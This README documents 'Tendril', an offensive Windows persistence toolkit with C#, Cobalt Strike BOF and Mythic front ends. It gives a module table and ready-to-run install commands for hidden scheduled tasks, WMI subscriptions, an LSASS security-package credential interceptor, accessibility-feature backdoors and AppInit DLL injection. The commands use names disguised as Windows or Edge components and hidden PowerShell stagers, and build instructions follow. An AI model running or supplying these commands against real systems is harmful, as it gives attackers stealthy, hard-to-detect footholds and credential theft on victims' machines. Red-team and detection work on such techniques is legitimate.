# Tendril

Modular persistence toolkit. C# assembly, unified BOF, Mythic command, and Cobalt Strike aggressor. 22 modules, 24/24 tested on live target.

## Modules

| Module | Technique | MITRE | Admin | Notes |
|--------|-----------|-------|-------|-------|
| ComHijack | COM object hijacking | T1546.015 | No | HKCU InProcServer32 override. DLL loads in explorer.exe on logon. Default targets: MMDeviceEnumerator, EhStorShell. Provide a proxy DLL to avoid breaking the shell. |
| WmiSubscription | WMI event subscription | T1546.003 | Yes | EventFilter + CommandLineEventConsumer + Binding in `root\subscription`. Lives in WMI repository (OBJECTS.DATA). No files, no registry, no services. Detection requires Sysmon 19/20/21. |
| GhostTask | Hidden scheduled task | T1053.005 | Yes | Creates task via COM, deletes SD value from `TaskCache\Tree`. Invisible to `schtasks /query`, Task Scheduler GUI, and most EDR task enumeration. Scheduler still executes it. |
| RegistryRunKey | Registry Run key | T1547.001 | No | Run/RunOnce with optional fileless mode: base64 payload stashed in separate registry value, Run entry points to a PS one-liner that reads and executes it. |
| ScreensaverBackdoor | Screensaver hijack | T1546.002 | No | Sets `SCRNSAVE.EXE` in `HKCU\Control Panel\Desktop`. Fires on idle timeout. |
| IFEOInjection | IFEO debugger / SilentProcessExit | T1546.012 | Yes | Two modes. **Debugger**: payload launches instead of target. **SilentProcessExit**: payload launches when target exits (GlobalFlag 0x200 + MonitorProcess). |
| StartupFolder | Startup folder LNK | T1547.001 | No | .lnk shortcut in user Startup via WScript.Shell COM. Custom icon, args, all-users (admin). |
| UserInitMprLogon | Logon script | T1037.001 | No | **Environment**: `HKCU\Environment\UserInitMprLogonScript`. **Winlogon**: appends to `Userinit` (admin). |
| WinlogonHelper | Winlogon Shell/Notify/Taskman | T1547.004 | No | HKCU Shell override (no admin, per-user). HKLM Shell append, Taskman, Notify package DLLs (admin). |
| AppInitDlls | AppInit_DLLs | T1546.010 | Yes | DLL loads into every user32.dll process. Sets LoadAppInit_DLLs=1, clears signature requirement. x64 and x86 (Wow6432Node). |
| AccessibilityBackdoor | Accessibility feature hijack | T1546.008 | Yes | IFEO debugger on sethc/utilman/narrator/magnify/osk. Triggerable from RDP logon screen pre-auth. |
| PowerShellProfile | PowerShell profile injection | T1546.013 | No | Appends payload to `$PROFILE`. Marker-based install/cleanup. CurrentUser = no admin. |
| ScheduledTaskHijack | Scheduled task action rewrite | T1053.005 | No | Rewrites existing task's `<Command>` in its XML. Task name/author/triggers stay intact. Backs up original. |
| NetshHelperDll | Netsh helper DLL | T1546.007 | Yes | Registers DLL under `HKLM\SOFTWARE\Microsoft\NetSh`. Loads when netsh.exe runs. Baseline-aware check. |
| PortMonitorDll | Print Spooler port monitor | T1547.010 | Yes | DLL loaded by spoolsv.exe as SYSTEM at boot. Registry: `Print\Monitors\[Name]\Driver`. DLL must be in System32. |
| SecuritySupportProvider | LSASS SSP | T1547.005 | Yes | DLL loaded by LSASS at boot via `Lsa\Security Packages` (REG_MULTI_SZ). Intercepts all auth events. Reboot required. |
| TimeProviderDll | W32Time time provider | T1547.003 | Yes | DLL loaded by W32Time service as SYSTEM. Registry: `W32Time\TimeProviders\[Name]`. Restart W32Time or reboot to load. Very low detection. |
| ActiveSetup | Active Setup StubPath | T1547.014 | Yes | HKLM version key triggers StubPath once per user logon. Fires for every new domain user. Executes as logged-on user, not SYSTEM. |
| BitsJobPersist | BITS job notification | T1197 | Yes | BITS transfer job with notification command. Survives reboots, re-fires on logon. Runs as SYSTEM. Rarely audited. |
| DllSideloadEnum | DLL sideload recon | T1574.002 | No | Recon. Writable non-KnownDLL/non-system DLLs in running processes. Signed EXEs in writable dirs. |
| PathDllPlant | %PATH% DLL planting | T1574.007 | No | Recon. Writable directories in system and user %PATH%. |
| ServiceBinaryHijack | Service binary / unquoted path | T1574.010 | No | Recon. Writable service binaries and unquoted paths with writable intermediate segments. |

## Usage

### C# Assembly (standalone or execute-assembly)

```
Tendril.exe list
Tendril.exe check
Tendril.exe check ComHijack
Tendril.exe info GhostTask

Tendril.exe install ComHijack /payload:C:\proxy.dll /clsid:{BCDE0395-E52F-467C-8E3D-C4579291692E}
Tendril.exe install GhostTask /payload:C:\svc.exe /name:EdgeUpdate /trigger:logon
Tendril.exe install WmiSubscription /payload:"powershell -w hidden -c ..." /name:SysHealth
Tendril.exe install RegistryRunKey /payload:"calc.exe" /name:TestKey /fileless:true
Tendril.exe install IFEOInjection /target:notepad.exe /payload:C:\x.exe /mode:silent
Tendril.exe install ScreensaverBackdoor /payload:C:\p.scr /timeout:300
Tendril.exe install StartupFolder /payload:C:\svc.exe /name:SecurityHealth
Tendril.exe install UserInitMprLogon /payload:C:\logon.bat /variant:environment
Tendril.exe install WinlogonHelper /payload:C:\svc.exe /target:shell /hive:HKCU
Tendril.exe install AppInitDlls /payload:C:\hook.dll
Tendril.exe install AccessibilityBackdoor /target:sethc /payload:C:\cmd.exe /mode:ifeo
Tendril.exe install PowerShellProfile /payload:"iex(gc C:\stager.ps1)" /scope:currentuser
Tendril.exe install NetshHelperDll /payload:C:\helper.dll /name:nettrace
Tendril.exe install PortMonitorDll /payload:monitor.dll /name:LegitMonitor
Tendril.exe install SecuritySupportProvider /payload:mimilib
Tendril.exe install TimeProviderDll /payload:C:\Windows\System32\timeprov.dll /name:NtpSync
Tendril.exe install ActiveSetup /payload:C:\svc.exe /name:"Edge Helper"
Tendril.exe install BitsJobPersist /payload:C:\svc.exe /name:WindowsUpdate

Tendril.exe remove ComHijack /clsid:{BCDE0395-E52F-467C-8E3D-C4579291692E}
Tendril.exe remove GhostTask /name:EdgeUpdate
```

### Cobalt Strike BOF

Single unified BOF. Load `aggressor/tendril.cna`:

```
tendril <module> <action> [arg1] [arg2] [arg3]

tendril com_hijack      install C:\proxy.dll {BCDE0395-E52F-467C-8E3D-C4579291692E}
tendril ghost_task      check
tendril registry_run    install C:\svc.exe UpdateSvc HKCU
tendril ifeo_inject     install C:\x.exe notepad.exe silent
tendril screensaver     install C:\p.scr 300
tendril appinit_dlls    install C:\hook.dll x64
tendril winlogon_helper install C:\svc.exe Shell HKCU
tendril accessibility   install C:\cmd.exe sethc.exe
tendril netsh_helper    install C:\helper.dll nettrace
tendril userinit_mpr    install C:\logon.bat
tendril port_monitor    install monitor.dll LegitMonitor
tendril ssp             install mimilib
tendril time_provider   install C:\timeprov.dll NtpSync
tendril active_setup    install C:\svc.exe {GUID} "Edge Helper"
```

### Mythic (Apollo / EmeraldStrike)

Copy `mythic/tendril.py` into the agent's `agent_functions/` directory. Upload the BOF via `register_bof` (EmeraldStrike) or `register_file` (Apollo). Optionally upload the `.json` schema alongside the `.o` for auto-format.

```
tendril com_hijack install C:\proxy.dll {BCDE0395-E52F-467C-8E3D-C4579291692E}
tendril ghost_task check
tendril ifeo_inject install C:\x.exe notepad.exe silent
tendril port_monitor install monitor.dll LegitMonitor
tendril active_setup install C:\svc.exe {GUID}
```

Or via `inline_execute` directly (EmeraldStrike, no tendril.py needed):
```
inline_execute -BOF tendril.x64.o -Arguments "0 0 C:\proxy.dll {BCDE0395} Both" -ArgumentTypes ssZZZ
```

BOF argument format: `ssZZZ` - two `int16` (module ID, action ID) + three wide strings.

| ID | Module | ID | Module |
|---|---|---|---|
| 0 | com_hijack | 7 | accessibility |
| 1 | ghost_task | 8 | netsh_helper |
| 2 | registry_run | 9 | userinit_mpr |
| 3 | screensaver | 10 | port_monitor |
| 4 | ifeo_inject | 11 | ssp |
| 5 | appinit_dlls | 12 | time_provider |
| 6 | winlogon_helper | 13 | active_setup |

Action IDs: `0`=install, `1`=remove, `2`=check

## Building

### C#

```
msbuild Tendril.sln /p:Configuration=Release
```

Output: `Tendril\bin\Release\Tendril.exe` (.NET 4.0)

### BOF

```
cd bof && make                # Linux / WSL / MSYS2
cd bof && build.bat           # Windows (needs MinGW on PATH or MSYS2)
```

Output: `bof/build/tendril.x64.o`, `bof/build/tendril.x86.o`

VS: build the TendrilBOF project from the solution (dispatches to `build.bat`).

## Adding a Module

### C#

Create `Tendril\Modules\YourModule.cs` implementing `ITendril` in namespace `Tendril.Modules`. Rebuild. Auto-discovered via reflection.

### BOF

Add a `static void mod_your_module(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)` function in `bof/tendril.c`, add an enum entry, add the case to the `go()` switch. Update `MODULE_IDS` in `mythic/tendril.py` and `aggressor/tendril.cna` to match.

## Project Layout

```
Tendril.sln
Tendril/                  C# assembly (.NET 4.0, 22 modules)
  Core/                   ITendril, ModuleRegistry, TendrilResult
  Modules/                One file per technique (reflection-discovered)
  Native/                 P/Invoke
  Utilities/              Registry, file, output helpers
  Program.cs              CLI entry
bof/
  tendril.c               Unified BOF (14 modules, single go() dispatch)
  include/                beacon.h (CS 4.13), beacon_gate.h, tendril.h
  TendrilBOF.vcxproj      VS Makefile project
  build.bat / Makefile     Windows / Linux builds
mythic/
  tendril.py              Mythic command definition (Apollo + EmeraldStrike)
  tendril.x64.o.json      BOF schema for EmeraldStrike inline_execute
  tendril.x86.o.json      BOF schema for EmeraldStrike inline_execute
aggressor/
  tendril.cna             CS aggressor - tendril <module> <action> [args]
```

## References

### Persistence Technique Research
- 0xdbgman, *Persistence: Advanced Red Team Persistence Techniques* (2025) - Port Monitor DLL (APT41), SSP, Time Provider DLL, Active Setup, BITS Jobs, Application Shimming, Office startup, IFEO VerifierDlls, Accessibility Features, scheduled task SD deletion, COM hijacking, AppDomainManager injection
- Microsoft Threat Intelligence, *Tarrask* (2022) - Ghost scheduled task via Security Descriptor deletion from TaskCache registry
- Zscaler ThreatLabz, *APT28 Operation Neusploit* (2026) - COM hijacking (EhStorShell.dll), DLL proxying, steganography payload, Covenant Grunt via PixyNetLoader, CVE-2026-21509
- Alachkar et al., *EvilEDR* (USENIX Security 2025) - EDR repurposing as persistence/C2 (MDE, Elastic Defend, Sophos, Trend Micro)
- avantguard.io, *Threadless Ops II* (2025) - Module stomping, Caro-Kann delayed decryption, call-stack spoofing with Crystal Palace PIC framework
- redhunt.io, *Bypassing EDR in 2026* - BYOVD, hardware breakpoint hook bypass, indirect syscalls with return-address spoofing, AMSI context bypass
- AutoBypass (arXiv 2608.01639) - Multi-agent EDR evasion, polymorphic loader generation, module_overload and remote_thread_hijack effectiveness rates
- HackTricks, *DLL Hijacking* (2026) - Scheduled task action rewrite, AppDomainManager .config injection, DLL proxy pattern, Lenovo TPQM sideload chain
- ManageEngine, *Fileless Malware Remediation* (2026) - WMI subscription triad, ClickFix delivery to persistence chain, MITRE T1204.004/T1059.001 updates
- ACM SoK (2025) - *Systematization, Detection, and Hunting of Windows Malware Persistence Techniques*, 72 techniques, false-positive/negative analysis of industry tools

### SharpUp (GhostPack)
- SharpUp `Checks/` - ModifiableServiceBinaries, UnquotedServicePath, ModifiableScheduledTaskFile, HijackablePaths, ProcessDLLHijack, RegistryAutoruns, ModifiableServices, ModifiableServiceRegistryKeys. Patterns adapted for Tendril's ServiceBinaryHijack, PathDllPlant, ScheduledTaskHijack, and DllSideloadEnum modules.

### Agent References
- Apollo (Mythic) - `execute_coff` BOF loader with COFFLoader.dll, `reg_write_value` command pattern, TypedArray bof_pack argument format
- EmeraldStrike (Mythic) - `inline_execute` BOF loader with `_bof_pack` (ssZZZ format), `register_bof` file management, `.json` schema auto-format for aggressor-script argument inference
- Cobalt Strike 4.13 `beacon.h` / `beacon_gate.h` - Official BOF API headers with Beacon Gate, syscall API (BEACON_SYSCALLS), data store, key/value store
